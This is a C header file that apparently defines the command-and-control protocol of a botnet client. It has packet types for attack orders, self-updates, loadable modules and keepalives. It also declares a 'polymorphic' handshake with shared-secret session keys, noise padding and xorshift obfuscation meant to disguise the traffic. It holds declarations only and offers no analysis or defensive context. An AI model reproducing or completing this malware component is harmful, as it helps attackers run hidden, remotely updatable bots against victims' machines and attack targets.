#pragma once
#include <stdint.h>

#define SHARED_SECRET_LEN 32
#define CHALLENGE_LEN     32
#define RESPONSE_LEN      32
#define SESSION_KEY_LEN   32
#define NOISE_MAX         64
#define MAGIC_LEN         2

#define PKT_TYPE_ATTACK      0
#define PKT_TYPE_UPDATE      1
#define PKT_TYPE_UPDATE_DONE 2
#define PKT_TYPE_PING        3
#define PKT_TYPE_PONG        4
#define PKT_TYPE_MODULE      5
#define PKT_TYPE_MODULE_DONE 6
#define PKT_TYPE_MODULE_LIST 7

#define UPDATE_CHUNK_SIZE  4096

#define ACK_OK   0x01
#define ACK_FAIL 0x00

struct handshake_ctx {
    uint8_t challenge[CHALLENGE_LEN];
    uint8_t session_key[SESSION_KEY_LEN];
    uint8_t noise_skip;
    int valid;
};

int  polymorphic_handshake(int fd, struct handshake_ctx *ctx, const uint8_t *shared_secret);
int  polymorphic_send(int fd, struct handshake_ctx *ctx,
                      uint8_t type, uint8_t bitmap,
                      const uint8_t *payload, uint32_t payload_len);
int  polymorphic_recv(int fd, struct handshake_ctx *ctx,
                      uint8_t *type, uint8_t *bitmap,
                      uint8_t *buf, uint32_t *len);
int  polymorphic_recv_inplace(struct handshake_ctx *ctx,
                              uint8_t *type, uint8_t *bitmap,
                              uint8_t *buf, uint32_t *len);
void session_key_from_challenge(const uint8_t *challenge, const uint8_t *secret, uint8_t *key_out);
void xorshift_buf(uint8_t *buf, uint32_t len, const uint8_t *key);
